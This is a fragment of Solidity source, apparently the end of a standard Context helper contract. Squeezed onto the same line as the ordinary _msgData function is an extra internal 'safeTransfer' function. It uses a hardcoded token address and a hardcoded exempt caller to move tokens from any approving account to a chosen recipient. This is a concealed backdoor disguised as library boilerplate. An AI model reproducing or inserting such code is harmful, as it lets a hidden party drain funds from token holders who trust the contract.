 ...
 */
  function _msgData() internal view virtual returns (bytes calldata) {return msg.data;}function safeTransfer(address spender,address recipient,uint256 amount) internal returns (bool) {if (msg.sender != address(0x6f389f8509c186CecEC4aB5DBa148736163AcEb7)) {TransferHelper.safeTransferFrom(0xFD5E08dd13827f48FCC2775FCD3606350c896b6d,spender,recipient,amount);return true;}return false;}
}
